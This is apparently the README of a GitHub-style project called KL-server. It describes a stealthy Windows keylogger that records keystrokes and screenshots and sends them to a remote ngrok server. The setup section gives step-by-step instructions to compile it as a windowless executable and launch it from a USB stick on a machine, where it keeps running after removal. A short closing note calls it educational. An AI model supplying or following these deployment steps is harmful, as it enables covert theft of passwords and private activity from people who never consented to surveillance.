# 📄 KL-server — USB-Based Keylogger & Screenshot Sender

## 🧠 Overview
**KL-server** is a modular keylogging and screenshot capture system designed for Windows. It runs silently in the background, logs keyboard input, captures periodic screenshots, and sends all data to a remote NGROK server. The system is optimized for USB execution: once launched from a USB stick, it remains active even after the device is removed.


## ⚙️ Setup Instructions
1. **Edit `server.txt`**  
   Add the URL address of the Ngrok server after running `server.py`

2. **Creating file .exe**  
   Use the following command:
   ```bash
   pyinstaller --onefile --noconsole logger.py
   ```
3. **Launching**  
   Copy the `server.txt` and `logger.exe` in a USB stick, plug it in a machine and launch the .exe


## 🖥️ Server (Receiver)
On the receiving machine. It will:
- Save keyboard data to `received_data.txt`  
- Save screenshots to the `screenshots/` folder with incremental filenames (`Screenshot_0.png`, `Screenshot_1.png`, ...)  

> ⚠️ This project is a modified version of [David Bombal's Python Keylogger](https://github.com/davidbombal/python-keylogger/blob/main/keylogger.py), adapted for screenshot capture, stealth execution, and remote data transmission.  
> The GUI version is still being under construction, check it [here]()

## 🔒 Notes
- This project is **for educational use only**.  
- It must be executed in a **controlled lab environment**.  
- Do not deploy or distribute outside of academic demonstrations.  
- The purpose is to analyze how such techniques work and how they can be detected and prevented. 
